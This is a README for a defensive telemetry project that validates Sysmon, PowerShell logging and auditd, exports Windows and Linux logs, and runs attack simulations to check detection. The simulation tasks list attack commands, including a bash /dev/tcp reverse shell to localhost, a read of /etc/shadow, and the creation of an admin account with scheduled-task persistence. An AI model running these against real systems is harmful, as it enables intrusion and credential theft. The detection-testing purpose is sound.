# 2x02 – Eyes on Endpoint

## Task - 0-sysmon_validation.ps1
What it does: Validates that Sysmon actually captures the five event types the rest of the project depends on (process creation, network connection, file creation, registry modification, DNS query), by firing one real, safe trigger per type and checking whether it shows up in the Sysmon Operational log. Read-only against the system — the only artifacts created (test file and registry value) are removed at the end.
How to use: run locally on Windows with Sysmon installed (`.\0-sysmon_validation.ps1`), preferably with administrative privileges so every trigger fires.
Commands:
- `Get-WinEvent -LogName <log>` — queries a Windows event log by ID/time; the core cmdlet for confirming Sysmon actually wrote an event.
- `cmd.exe /c whoami` — safe trigger that generates a process creation event (Sysmon EID 1).
- `Test-NetConnection -ComputerName <ip> -Port <port>` — tests outbound TCP connectivity; trigger for the network connection event (Sysmon EID 3).
- `New-Item -Path <key> -Force` — creates a registry key; part of the registry modification trigger (Sysmon EID 13).
- `New-ItemProperty -Path <key> -Name <name> -Value <value> -PropertyType String` — writes a registry value; completes the registry modification trigger (Sysmon EID 13).
- `nslookup <domain>` — resolves a DNS name; trigger for the DNS query event (Sysmon EID 22).
- `Resolve-DnsName -Name <domain>` — PowerShell's native DNS resolver; alternate trigger for the same DNS query telemetry.
- `Out-File -FilePath <path>` — writes a file to disk; trigger for the file creation event (Sysmon EID 11).

## Task - 1-sysmon_coverage_matrix.ps1
What it does: Reads the actually deployed sysmonconfig.xml and maps 7 MITRE ATT&CK techniques to the Sysmon Event IDs required to see them, judging whether each RuleGroup's real include/exclude filter genuinely covers (covered), only catches a narrow slice (partial), or misses (blind) each technique.
How to use: run on the Windows host where Sysmon is configured (`.\1-sysmon_coverage_matrix.ps1`), optionally pointing at a custom sysmonconfig.xml via `-SysmonConfigPath`.
Commands:
- `Get-Content -Path <file> -Raw` — reads the raw content of the deployed sysmonconfig.xml so it can be parsed as XML; used to audit what Sysmon is actually configured to capture.

## Task - 2-powershell_logging_validation.ps1
What it does: Confirms that Script Block Logging, Module Logging and Transcription (enabled via GPO in the earlier module) actually work against the kinds of PowerShell the Crimson Tide attacker used: a plain cmdlet, a Base64-encoded command, a module import, and a multi-line script block.
How to use: run on a Windows host with PowerShell logging enabled (`.\2-powershell_logging_validation.ps1`).
Commands:
- `Get-Process` — trigger: a simple command whose script block should be captured in EID 4104 (Script Block Logging).
- `powershell.exe -EncodedCommand <base64>` — trigger: runs a Base64-encoded command; tests whether the log decodes the obfuscated content.
- `Import-Module <name>` — trigger: imports a PowerShell module; generates a Module Logging event (EID 4103).
- `Invoke-Expression <script>` — trigger: dynamically executes a multi-line script block; tests whether the full block is captured in EID 4104.
- `Get-ChildItem -Path <dir> -Filter "*.txt"` — lists files in the transcript directory; confirms the session's transcript was actually written to disk.

## Task - 3-windows_telemetry_export.ps1
What it does: Exports a configurable time window (default: last 24 hours) from the Security, Sysmon Operational and PowerShell Operational logs into one normalized JSON file, pulling the key fields for each event type (4624, 4625, 4672, 4688, 4104, Sysmon 1/3/11/13/22) out of the event's structured XML data, not regex over the free-text message.
How to use: run on the Windows host being exported (`.\3-windows_telemetry_export.ps1`), adjusting `-StartTime`/`-EndTime` for a different window.
Commands:
- (no new command — reuses `Get-WinEvent`, already covered in Task 0, now with `-FilterHashtable` to query multiple logs over a time window)

## Task - 4-windows_telemetry_quality.ps1
What it does: Applies a quality gate to Task 3's export — event distribution, channel balance, hour-by-hour time coverage, gap detection (>30 minutes silent), field completeness on the event types analysts actually triage, and a single weighted 0-100 score with a good/acceptable/poor verdict.
How to use: run after Task 3 (`.\4-windows_telemetry_quality.ps1`), reading windows_events_export.json by default.
Commands:
- (no new command — the script only reads and analyzes the already-exported JSON, without querying the live system)

## Task - 5-auditd_refine.sh
What it does: Adds five detection-focused auditd rules (execve, socket/connect, SSH key access, cron persistence, sudoers.d) to meddefense.rules idempotently, reloads auditd, and proves each new rule fires with a real, safe trigger checked via ausearch.
How to use: run as root on the Linux host (`sudo ./5-auditd_refine.sh`); RULES_FILE can be overridden to test in scratch mode.
Commands:
- `auditctl -l` — lists the audit rules currently loaded in the kernel; used to check what is actually active, not just what is written to the file.
- `augenrules --load` — merges the files under /etc/audit/rules.d/ and reloads the resulting rule set into the kernel audit subsystem.
- `auditctl -R <file>` — loads a rules file directly into the kernel audit subsystem (fallback path when augenrules is unavailable).
- `ausearch -k <key>` — searches the audit log for records tagged with a given key; the core tool for confirming a rule actually fired.
- `/usr/bin/id` — trigger: a simple command execution to test execve syscall tracking.
- `curl http://localhost` — trigger: generates an outbound network connection to test socket/connect syscall tracking.
- `touch <file>` — trigger: creates/updates a file to test a watch (-w) auditd rule.

## Task - 6-log_source_map.sh
What it does: Inventories the existing Linux log sources (auth.log, audit.log, syslog, kern.log, apache2, dpkg, ufw, fail2ban) — path, format, real rotation policy (read from logrotate), current size, an estimated event rate and a security relevance rating — and flags any expected source that is missing or silent.
How to use: run on the Linux host being inventoried (`./6-log_source_map.sh`); read-only, makes no configuration changes.
Commands:
- `grep -rl -F <pattern> /etc/logrotate.d/` — finds which logrotate stanza governs a given log path; used to determine the real retention policy instead of assuming one.
- `stat -c%s <file>` — returns a file's size in bytes; used to characterize a log source's current volume.
- `wc -l <file>` — counts the lines in a log file; used to estimate its hourly event rate.

## Task - 7-linux_export.sh
What it does: The Linux counterpart to Task 3 — normalizes auth.log (SSH logins, sudo, su), audit.log (execve, file access, network) and syslog (service lifecycle, errors) into the same structured JSON shape as the Windows export, using one awk pass per file (not a per-line subprocess) for performance.
How to use: run on the Linux host (`./7-linux_export.sh [output.json]`); read-only.
Commands:
- `awk '<pattern>' <log_file>` — parses log lines field-by-field in a single pass (no per-line subprocess); the core technique used to extract SSH logins, sudo/su usage, auditd execve/file/network records, and syslog service/error lines.
- `hostname` — returns the local hostname; used to tag every normalized event with its origin host.

## Task - 8-linux_telemetry_quality.sh
What it does: Applies the exact same quality standard from Task 4 to linux_events_export.json — event distribution, hour-by-hour time coverage, gap detection, field completeness (execve command line, SSH source IP/user, auditd file path) and a weighted 0-100 quality score.
How to use: run after Task 7 (`./8-linux_telemetry_quality.sh`), reading linux_events_export.json by default.
Commands:
- (no new command — the script only uses jq to analyze the already-exported JSON, without querying the live system)

## Task - 9-windows_attack_sim.ps1
What it does: Runs the Crimson Tide playbook's techniques as one realistic sequence against the project's own endpoint — create a user, escalate privileges, run encoded PowerShell, establish persistence, beacon outbound, drop a startup payload — timestamping each action for later correlation. Every real change made (user, group, scheduled task, file) is reverted at the end.
How to use: run with administrative privileges on the Windows host (`.\9-windows_attack_sim.ps1`); produces windows_attack_log.json as ground truth.
Commands:
- `New-LocalUser -Name <user> -Password <securestring>` — trigger: creates a local user account (T1136.001), expected in Security EID 4720.
- `Add-LocalGroupMember -Group "Administrators" -Member <user>` — trigger: adds the user to the local Administrators group (T1098), expected in Security EID 4732.
- `schtasks /create /tn <name> /tr <command> /sc daily /st <time> /f` — trigger: creates a scheduled task for persistence (T1053.005).

## Task - 10-windows_detection_proof.ps1
What it does: Correlates Task 9's ground truth against the telemetry actually captured (Sysmon, Security, PowerShell), producing a detection matrix that shows, for every simulated action, whether it was captured, by which source, with what Event ID, and at what detail level (full/partial/missed).
How to use: run after Task 9 (`.\10-windows_detection_proof.ps1`), reading windows_attack_log.json by default.
Commands:
- (no new command — reuses `Get-WinEvent`, already covered in Task 0, now searching within a ±30s window around each action)

## Task - 11-linux_attack_sim.sh
What it does: The Linux counterpart to Task 9 — create a user, modify sudoers, execute from /tmp, attempt a reverse shell (to localhost, safe), establish cron persistence, access /etc/shadow — timestamping each action for later correlation. A trap on EXIT guarantees cleanup runs even if a step fails partway through.
How to use: run as root on the Linux host (`sudo ./11-linux_attack_sim.sh`); produces linux_attack_log.json as ground truth.
Commands:
- `useradd -M -N -s /usr/sbin/nologin <user>` — trigger: creates a user account with no home directory or login shell (T1136.001).
- `chmod 440 <sudoers_file>` — trigger: sets permissions on the freshly written sudoers file (T1548.003).
- `cp /usr/bin/id <destination>` — trigger: copies a binary into /tmp to simulate suspicious tooling before executing it (T1059).
- `bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &'` — trigger: attempts a reverse shell using bash's /dev/tcp pseudo-device, against localhost (T1071).
- `cat /etc/shadow` — trigger: reads a sensitive credential file (T1003.008).

## Task - 12-linux_detection_proof.sh
What it does: The Linux counterpart to Task 10 — for every action in linux_attack_log.json, searches auditd (and auth.log for the user-creation action) within a ±30s window, revealing whether the auditd rules actually produce a matching event, not just whether the key exists in the rules file.
How to use: run as root after Task 11 (`sudo ./12-linux_detection_proof.sh`).
Commands:
- (no new command — reuses `ausearch -k`, already covered in Task 5, now with a `-ts`/`-te` time window around each action)

## Task - 13-consolidated_export.sh
What it does: Assembles the telemetry_handoff/ package by combining the Windows (Task 3) and Linux (Task 7) exports with the Windows and Linux attack ground truth (Tasks 9 and 11), normalizing every timestamp to UTC ISO 8601 and verifying every event carries the 4 common fields before packaging.
How to use: run after Tasks 3, 7, 9 and 11 (`./13-consolidated_export.sh`), producing the telemetry_handoff/ directory.
Commands:
- (no new command — the script only combines and normalizes with jq the JSON files already exported by earlier tasks)

## Task - 14-coverage_assessment.sh
What it does: Generates the single metadata file that travels with the handoff package — total events by platform/source/category, a summary of the detection matrices (Tasks 10 and 12), ATT&CK coverage pulled from Task 1, a Known Gaps list (every partial/blind technique plus every [MISSED] entry), and a quality summary whose confidence is capped at "acceptable" whenever any technique is blind.
How to use: run after Tasks 1, 4, 8, 10, 12 and 13 (`./14-coverage_assessment.sh`).
Commands:
- (no new command — the script only aggregates with jq the JSON reports already generated by earlier tasks)

## Task - 15-handoff_validation.sh
What it does: The final quality gate before handoff to Module 3 — validates file existence, JSON validity, required-field presence, minimum event counts, ISO 8601 timestamp sanity (no future dates), cross-platform time-range overlap, and ground truth completeness against the detection matrices. The verdict is PASS only if every individual check passes.
How to use: run as the last step, after Task 13 (`./15-handoff_validation.sh`).
Commands:
- (no new command — the script only validates with jq the JSON files already generated by earlier tasks)
